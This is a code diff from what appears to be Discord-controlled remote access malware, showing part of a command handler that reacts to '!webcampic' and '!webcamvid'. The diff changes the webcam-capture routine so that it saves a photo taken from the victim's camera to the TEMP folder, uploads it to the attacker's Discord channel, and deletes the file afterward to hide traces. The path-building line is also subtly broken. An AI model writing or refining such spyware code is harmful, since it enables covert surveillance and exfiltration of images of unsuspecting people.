@@ -176,13 +176,17 @@ async def on_message(message):
 
         if message.content == '!webcampic':
             import cv2
+            import os
             cam = cv2.VideoCapture(0)
             retval, frame = cam.read()
             cam.release()
-            cv2.imwrite('filename.jpg', frame)
+            cv2.imwrite(os.path.join(
+                os.getenv('TEMP') + 'filename.jpg'), frame)
             cam.release()
-            file = discord.File("filename.jpg", filename="filename.jpg")
+            file = discord.File(os.path.join(
+                os.getenv('TEMP') + 'filename.jpg'), filename="filename.jpg")
             await  message.channel.send("[*] Command successfuly executed", file=file)
+            os.remove(os.path.join(os.getenv('TEMP') + 'filename.jpg'))
 
         if message.content.startswith('!webcamvid'):
             import numpy as np
